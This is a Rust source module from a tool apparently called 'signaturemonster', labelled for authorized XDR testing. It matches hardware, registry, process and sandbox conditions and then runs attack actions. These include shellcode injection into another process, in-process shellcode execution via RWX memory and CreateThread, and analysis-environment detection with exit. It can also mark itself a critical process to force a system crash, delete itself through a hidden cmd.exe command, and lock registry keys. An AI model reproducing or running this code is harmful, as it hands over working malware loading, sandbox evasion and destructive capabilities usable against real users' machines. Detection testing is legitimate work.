//! Signature management module with action execution for XDR testing
//!
//! WARNING: For authorized security testing only

use crate::{SignatureRule, SignatureCondition, MatchType, HwidField, Action, Result, SignatureMonsterError, SignatureChecker};
use std::path::Path;
use std::fs;

#[cfg(target_os = "windows")]
use windows::Win32::System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_PROTECTION_FLAGS};
#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::CreateThread;

/// Signature database that holds all loaded rules
#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct SignatureDatabase {
    /// Version of the signature database
    #[serde(default)]
    pub version: String,
    /// Description of the signature set
    #[serde(default)]
    pub description: String,
    /// Author of the signatures
    #[serde(default)]
    pub author: String,
    /// List of signature rules
    #[serde(default)]
    pub rules: Vec<SignatureRule>,
}

impl SignatureDatabase {
    /// Create a new empty signature database
    pub fn new() -> Self {
        Self::default()
    }

    /// Load signatures from a YAML file
    pub fn load_from_yaml<P: AsRef<Path>>(path: P) -> Result<Self> {
        let content = fs::read_to_string(path)
            .map_err(|e| SignatureMonsterError::IoError(e))?;
        Self::parse_yaml(&content)
    }

    /// Parse signatures from YAML string
    pub fn parse_yaml(yaml: &str) -> Result<Self> {
        serde_yaml::from_str(yaml)
            .map_err(|e| SignatureMonsterError::ParseError(e.to_string()))
    }

    /// Save signatures to a YAML file
    pub fn save_to_yaml<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let yaml = serde_yaml::to_string(self)
            .map_err(|e| SignatureMonsterError::ParseError(e.to_string()))?;
        fs::write(path, yaml)?;
        Ok(())
    }

    /// Load signatures from a JSON file
    pub fn load_from_json<P: AsRef<Path>>(path: P) -> Result<Self> {
        let content = fs::read_to_string(path)?;
        Self::parse_json(&content)
    }

    /// Parse signatures from JSON string
    pub fn parse_json(json: &str) -> Result<Self> {
        serde_json::from_str(json)
            .map_err(|e| SignatureMonsterError::ParseError(e.to_string()))
    }

    /// Add a rule to the database
    pub fn add_rule(&mut self, rule: SignatureRule) {
        self.rules.push(rule);
    }

    /// Remove a rule by ID
    pub fn remove_rule(&mut self, id: &str) -> bool {
        let len_before = self.rules.len();
        self.rules.retain(|r| r.id != id);
        self.rules.len() < len_before
    }

    /// Find a rule by ID
    pub fn find_rule(&self, id: &str) -> Option<&SignatureRule> {
        self.rules.iter().find(|r| r.id == id)
    }

    /// FIXED: Proper evaluation that actually checks conditions and executes actions
    pub fn evaluate(&self) -> Result<()> {
        let checker = SignatureChecker::new();
        
        println!("[*] Starting signature evaluation with {} rules", self.rules.len());
        
        for rule in &self.rules {
            println!("[*] Checking rule: {} ({})", rule.name, rule.id);
            
            // FIXED: Use the actual condition checking from SignatureRule
            let triggered = if rule.conditions.is_empty() {
                println!("    -> No conditions, always triggers");
                true
            } else {
                match rule.matches(&checker) {
                    Ok(matched) => {
                        println!("    -> Conditions evaluated: {}", if matched { "MATCH" } else { "NO MATCH" });
                        matched
                    }
                    Err(e) => {
                        println!("    -> Error checking conditions: {}", e);
                        false
                    }
                }
            };

            if triggered {
                println!("[!] Rule MATCHED! Executing {} actions...", rule.actions.len());
                for (i, action) in rule.actions.iter().enumerate() {
                    println!("    [Action {}] {:?}", i + 1, action);
                    match self.execute_action(action) {
                        Ok(_) => println!("    [Action {}] ✓ Success", i + 1),
                        Err(e) => println!("    [Action {}] ✗ Failed: {}", i + 1, e),
                    }
                }
            } else {
                println!("    -> Rule did not match, skipping actions");
            }
        }
        
        Ok(())
    }

    fn execute_action(&self, action: &Action) -> Result<()> {
        match action {
            Action::InjectDirect { process_name, shellcode_base64 } => {
                println!("[+] Executing: InjectDirect into process '{}'", process_name);
                
                // Check if shellcode is empty
                if shellcode_base64.is_empty() {
                    return Err(SignatureMonsterError::Generic("Shellcode base64 is empty".to_string()));
                }
                
                // Check if process exists
                let checker = SignatureChecker::new();
                if !checker.process.is_running(process_name) {
                    return Err(SignatureMonsterError::ProcessError(
                        format!("Process '{}' is not running", process_name)
                    ));
                }
                
                // Get process ID
                let processes = checker.process.find_by_name(process_name)?;
                if let Some(proc) = processes.first() {
                    println!("    -> Found target process: PID {}", proc.pid);                    
                    {
                        use base64::Engine;
                        let shellcode = base64::engine::general_purpose::STANDARD
                            .decode(shellcode_base64)
                            .map_err(|e| SignatureMonsterError::Generic(format!("Base64 decode failed: {}", e)))?;
                        
                        crate::injector::inject_shellcode(proc.pid, &shellcode)?;
                    }
                } else {
                    return Err(SignatureMonsterError::ProcessError("Process not found".to_string()));
                }
                
                Ok(())
            },
            
            Action::Exit { code } => {
                println!("[+] Executing: Exit with code {}", code);
                std::process::exit(*code);
            },
            
            Action::CheckAnalysis => {
                println!("[+] Executing: CheckAnalysis");
                let checker = SignatureChecker::new();
                if checker.process.check_for_analysis()? {
                    println!("    -> Analysis environment detected! Exiting...");
                    std::process::exit(1);
                } else {
                    println!("    -> No analysis environment detected");
                    Ok(())
                }
            },
            
            Action::MakeCritical => {
                println!("[+] Executing: MakeCritical");
                #[cfg(windows)]
                unsafe {
                    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
                    use windows::core::PCSTR;
                    
                    if let Ok(ntdll) = GetModuleHandleA(windows::core::s!("ntdll.dll")) {
                        if let Some(func) = GetProcAddress(ntdll, windows::core::s!("RtlSetProcessIsCritical")) {
                            let rtl_set_process_is_critical: unsafe extern "system" fn(u8, *mut u8, u8) -> i32 = 
                                std::mem::transmute(func);
                            rtl_set_process_is_critical(1, std::ptr::null_mut(), 0);
                        }
                    }
                }
                Ok(())
            },
            
            Action::ForceBsod => {
                println!("[+] Executing: ForceBsod (making process critical then terminating)");
                #[cfg(windows)]
                {
                    let _ = Action::MakeCritical.execute();
                    std::process::exit(1);
                }
                #[cfg(not(windows))]
                Ok(())
            },
            
            Action::SelfDelete => {
                println!("[+] Executing: SelfDelete");
                #[cfg(windows)]
                {
                    use std::process::Command;
                    use std::os::windows::process::CommandExt;
                    
                    if let Ok(path) = std::env::current_exe() {
                        let _ = Command::new("cmd.exe")
                            .args(&["/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", "/q", path.to_str().unwrap()])
                            .creation_flags(0x08000000)
                            .spawn();
                    }
                }
                Ok(())
            },
            
            #[cfg(feature = "regprotect")]
            Action::LockRegistry { path } => {
                println!("[+] Executing: LockRegistry for '{}'", path);
                let protector = crate::regprotect::RegistryProtection::new();
                protector.lock_key(path)?;
                Ok(())
            },
            
            #[cfg(not(feature = "regprotect"))]
            Action::LockRegistry { .. } => {
                Err(SignatureMonsterError::Generic("Registry protection feature not enabled".to_string()))
            },
        }
    }

    /// Generate Rust code that embeds these signatures
    pub fn generate_rust_code(&self) -> String {
        let mut code = String::new();
        
        code.push_str("//! Auto-generated signature database\n");
        code.push_str("//! Generated by signaturemonster\n\n");
        code.push_str("use signaturemonster::{SignatureRule, SignatureCondition, MatchType, HwidField, Action};\n\n");
        
        code.push_str("/// Get all embedded signature rules\n");
        code.push_str("pub fn get_signatures() -> Vec<SignatureRule> {\n");
        code.push_str("    vec![\n");
        
        for rule in &self.rules {
            code.push_str(&self.generate_rule_code(rule, 8));
        }
        
        code.push_str("    ]\n");
        code.push_str("}\n");
        
        code
    }

    fn generate_rule_code(&self, rule: &SignatureRule, indent: usize) -> String {
        let pad = " ".repeat(indent);
        let mut code = String::new();
        
        code.push_str(&format!("{}SignatureRule {{\n", pad));
        code.push_str(&format!("{}    id: \"{}\".to_string(),\n", pad, escape_string(&rule.id)));
        code.push_str(&format!("{}    name: \"{}\".to_string(),\n", pad, escape_string(&rule.name)));
        code.push_str(&format!("{}    description: \"{}\".to_string(),\n", pad, escape_string(&rule.description)));
        code.push_str(&format!("{}    conditions: vec![\n", pad));
        
        for cond in &rule.conditions {
            code.push_str(&self.generate_condition_code(cond, indent + 8));
        }
        
        code.push_str(&format!("{}    ],\n", pad));
        
        // Handle actions
        code.push_str(&format!("{}    actions: vec![\n", pad));
        for action in &rule.actions {
            code.push_str(&self.generate_action_code(action, indent + 8));
        }
        code.push_str(&format!("{}    ],\n", pad));

        let match_type = match rule.match_type {
            MatchType::All => "MatchType::All".to_string(),
            MatchType::Any => "MatchType::Any".to_string(),
            MatchType::AtLeast(n) => format!("MatchType::AtLeast({})", n),
        };
        code.push_str(&format!("{}    match_type: {},\n", pad, match_type));
        code.push_str(&format!("{}}},\n", pad));
        
        code
    }

    fn generate_action_code(&self, action: &Action, indent: usize) -> String {
        let pad = " ".repeat(indent);
        match action {
            Action::LockRegistry { path } => {
                format!("{}Action::LockRegistry {{ path: \"{}\".to_string() }},\n",
                    pad, escape_string(path))
            },
            Action::SelfDelete => format!("{}Action::SelfDelete,\n", pad),
            Action::MakeCritical => format!("{}Action::MakeCritical,\n", pad),
            Action::Exit { code } => format!("{}Action::Exit {{ code: {} }},\n", pad, code),
            Action::ForceBsod => format!("{}Action::ForceBsod,\n", pad),
            Action::CheckAnalysis => format!("{}Action::CheckAnalysis,\n", pad),
            Action::InjectDirect { process_name, shellcode_base64 } => {
                format!("{}Action::InjectDirect {{ process_name: \"{}\".to_string(), shellcode_base64: \"{}\".to_string() }},\n",
                    pad, escape_string(process_name), shellcode_base64)
            },
        }
    }

    fn generate_condition_code(&self, cond: &SignatureCondition, indent: usize) -> String {
        let pad = " ".repeat(indent);
        
        match cond {
            SignatureCondition::Hwid { field, pattern, regex } => {
                let field_str = match field {
                    HwidField::ProcessorId => "HwidField::ProcessorId",
                    HwidField::MotherboardSerial => "HwidField::MotherboardSerial",
                    HwidField::BiosSerial => "HwidField::BiosSerial",
                    HwidField::SystemUuid => "HwidField::SystemUuid",
                    HwidField::MachineGuid => "HwidField::MachineGuid",
                    HwidField::ProductId => "HwidField::ProductId",
                    HwidField::ComputerName => "HwidField::ComputerName",
                    HwidField::MacAddress => "HwidField::MacAddress",
                    HwidField::DiskSerial => "HwidField::DiskSerial",
                    HwidField::SystemModel => "HwidField::SystemModel",
                };
                format!("{}SignatureCondition::Hwid {{ field: {}, pattern: \"{}\".to_string(), regex: {} }}\n",
                    pad, field_str, escape_string(pattern), regex)
            }
            SignatureCondition::Registry { path, value_name, expected_data } => {
                format!("{}SignatureCondition::Registry {{ path: \"{}\".to_string(), value_name: {}, expected_data: {} }},\n",
                    pad, escape_string(path),
                    opt_string(value_name), opt_string(expected_data))
            }
            SignatureCondition::File { path, must_exist } => {
                format!("{}SignatureCondition::File {{ path: \"{}\".to_string(), must_exist: {} }},\n",
                    pad, escape_string(path), must_exist)
            }
            SignatureCondition::Process { name, regex } => {
                format!("{}SignatureCondition::Process {{ name: \"{}\".to_string(), regex: {} }},\n",
                    pad, escape_string(name), regex)
            }
            SignatureCondition::User { name, regex } => {
                format!("{}SignatureCondition::User {{ name: \"{}\".to_string(), regex: {} }},\n",
                    pad, escape_string(name), regex)
            }
            SignatureCondition::Service { name, must_be_running } => {
                format!("{}SignatureCondition::Service {{ name: \"{}\".to_string(), must_be_running: {} }},\n",
                    pad, escape_string(name), must_be_running)
            }
            SignatureCondition::ScheduledTask { name, regex } => {
                format!("{}SignatureCondition::ScheduledTask {{ name: \"{}\".to_string(), regex: {} }},\n",
                    pad, escape_string(name), regex)
            }
            SignatureCondition::DiskModel { pattern, regex } => {
                format!("{}SignatureCondition::DiskModel {{ pattern: \"{}\".to_string(), regex: {} }},\n",
                    pad, escape_string(pattern), regex)
            }
            SignatureCondition::AnalysisDetected => {
                format!("{}SignatureCondition::AnalysisDetected,\n", pad)
            }
            SignatureCondition::CpuidHypervisor { hypervisor } => {
                format!(
                    "{}SignatureCondition::CpuidHypervisor {{ hypervisor: {:?} }},\n",
                    pad, hypervisor
                )
            }
            SignatureCondition::CpuidVendor { pattern, regex } => {
                format!(
                    "{}SignatureCondition::CpuidVendor {{ pattern: \"{}\".to_string(), regex: {} }},
",
                    pad,
                    escape_string(pattern),
                    regex
                )
            }
            SignatureCondition::EventLogProvider { provider } => {
                format!(
                    "{}SignatureCondition::EventLogProvider {{ provider: \"{}\".to_string() }},
",
                    pad,
                    escape_string(provider)
                )
            }
        }
    }

    /// Save generated Rust code to a file
    pub fn save_rust_code<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let code = self.generate_rust_code();
        fs::write(path, code)?;
        Ok(())
    }
}

/// Execute shellcode directly in current process (XDR testing)
#[cfg(target_os = "windows")]
pub unsafe fn execute_shellcode_direct(shellcode_base64: &str) -> Result<()> {
    use base64::Engine;
    use std::ptr;
    
    println!("    -> Decoding base64 shellcode...");
    let shellcode = base64::engine::general_purpose::STANDARD
        .decode(shellcode_base64)
        .map_err(|e| SignatureMonsterError::ParseError(format!("Invalid base64: {}", e)))?;
    
    println!("    -> Decoded {} bytes", shellcode.len());
    println!("    -> Allocating RWX memory...");
    
    let addr = VirtualAlloc(
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    
    if addr.is_null() {
        return Err(SignatureMonsterError::ParseError("VirtualAlloc failed".to_string()));
    }
    
    println!("    -> Allocated at address: {:p}", addr);
    println!("    -> Copying shellcode...");
    
    ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
    
    println!("    -> Executing shellcode...");
    
    // Cast to function and execute
    let shellcode_fn: extern "C" fn() = std::mem::transmute(addr);
    shellcode_fn();
    
    println!("    -> Shellcode execution completed");
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn execute_shellcode_direct(_shellcode_base64: &str) -> Result<()> {
    Err(SignatureMonsterError::Generic("Shellcode execution only supported on Windows".to_string()))
}

/// Execute shellcode for XDR testing (with thread creation)
#[cfg(target_os = "windows")]
pub unsafe fn execute_shellcode_test(shellcode_base64: &str) -> Result<()> {
    use base64::Engine;
    
    let shellcode = base64::engine::general_purpose::STANDARD
        .decode(shellcode_base64)
        .map_err(|e| SignatureMonsterError::ParseError(format!("Invalid base64: {}", e)))?;
    
    execute_shellcode_in_thread(&shellcode)
}

#[cfg(target_os = "windows")]
unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<()> {
    use std::ptr;
    
    // Allocate RW memory
    let addr = VirtualAlloc(
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    if addr.is_null() {
        return Err(SignatureMonsterError::ParseError(
            "Failed to allocate memory".to_string()
        ));
    }
    
    // Copy shellcode
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        addr as *mut u8,
        shellcode.len(),
    );
    
    // Change to RWX (this should trigger XDR)
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let result = VirtualProtect(
        addr,
        shellcode.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );
    
    if result.is_err() {
        return Err(SignatureMonsterError::ParseError(
            "Failed to change memory protection".to_string()
        ));
    }
    
    // Create thread to execute (another XDR trigger)
    let thread_handle = CreateThread(
        None,
        0,
        Some(std::mem::transmute(addr)),
        None,
        Default::default(),
        None,
    );
    
    match thread_handle {
        Ok(_) => Ok(()),
        Err(_) => Err(SignatureMonsterError::ParseError(
            "Failed to create thread".to_string()
        )),
    }
}

fn escape_string(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n")
}

fn opt_string(opt: &Option<String>) -> String {
    match opt {
        Some(s) => format!("Some(\"{}\".to_string())", escape_string(s)),
        None => "None".to_string(),
    }
}

/// Builder for creating signature rules programmatically
pub struct SignatureBuilder {
    id: String,
    name: String,
    description: String,
    conditions: Vec<SignatureCondition>,
    actions: Vec<Action>,
    match_type: MatchType,
}

impl SignatureBuilder {
    pub fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            name: String::new(),
            description: String::new(),
            conditions: Vec::new(),
            actions: Vec::new(),
            match_type: MatchType::All,
        }
    }

    pub fn name(mut self, name: &str) -> Self {
        self.name = name.to_string();
        self
    }

    pub fn description(mut self, desc: &str) -> Self {
        self.description = desc.to_string();
        self
    }

    pub fn match_all(mut self) -> Self {
        self.match_type = MatchType::All;
        self
    }

    pub fn match_any(mut self) -> Self {
        self.match_type = MatchType::Any;
        self
    }

    pub fn match_at_least(mut self, n: usize) -> Self {
        self.match_type = MatchType::AtLeast(n);
        self
    }

    pub fn hwid(mut self, field: HwidField, pattern: &str) -> Self {
        self.conditions.push(SignatureCondition::Hwid {
            field,
            pattern: pattern.to_string(),
            regex: false,
        });
        self
    }

    pub fn hwid_regex(mut self, field: HwidField, pattern: &str) -> Self {
        self.conditions.push(SignatureCondition::Hwid {
            field,
            pattern: pattern.to_string(),
            regex: true,
        });
        self
    }

    pub fn registry_key(mut self, path: &str) -> Self {
        self.conditions.push(SignatureCondition::Registry {
            path: path.to_string(),
            value_name: None,
            expected_data: None,
        });
        self
    }

    pub fn registry_value(mut self, path: &str, value_name: &str, expected: Option<&str>) -> Self {
        self.conditions.push(SignatureCondition::Registry {
            path: path.to_string(),
            value_name: Some(value_name.to_string()),
            expected_data: expected.map(|s| s.to_string()),
        });
        self
    }

    pub fn file_exists(mut self, path: &str) -> Self {
        self.conditions.push(SignatureCondition::File {
            path: path.to_string(),
            must_exist: true,
        });
        self
    }

    pub fn file_not_exists(mut self, path: &str) -> Self {
        self.conditions.push(SignatureCondition::File {
            path: path.to_string(),
            must_exist: false,
        });
        self
    }

    pub fn process(mut self, name: &str) -> Self {
        self.conditions.push(SignatureCondition::Process {
            name: name.to_string(),
            regex: false,
        });
        self
    }

    pub fn process_regex(mut self, pattern: &str) -> Self {
        self.conditions.push(SignatureCondition::Process {
            name: pattern.to_string(),
            regex: true,
        });
        self
    }

    pub fn user(mut self, name: &str) -> Self {
        self.conditions.push(SignatureCondition::User {
            name: name.to_string(),
            regex: false,
        });
        self
    }

    pub fn service(mut self, name: &str, must_be_running: bool) -> Self {
        self.conditions.push(SignatureCondition::Service {
            name: name.to_string(),
            must_be_running,
        });
        self
    }

    pub fn scheduled_task(mut self, name: &str) -> Self {
        self.conditions.push(SignatureCondition::ScheduledTask {
            name: name.to_string(),
            regex: false,
        });
        self
    }

    pub fn disk_model(mut self, pattern: &str) -> Self {
        self.conditions.push(SignatureCondition::DiskModel {
            pattern: pattern.to_string(),
            regex: false,
        });
        self
    }

    pub fn action(mut self, action: Action) -> Self {
        self.actions.push(action);
        self
    }

    pub fn inject_shellcode(mut self, process: &str, shellcode_b64: &str) -> Self {
        self.actions.push(Action::InjectDirect {
            process_name: process.to_string(),
            shellcode_base64: shellcode_b64.to_string(),
        });
        self
    }

    pub fn build(self) -> SignatureRule {
        SignatureRule {
            id: self.id,
            name: self.name,
            description: self.description,
            conditions: self.conditions,
            match_type: self.match_type,
            actions: self.actions,
        }
    }
}
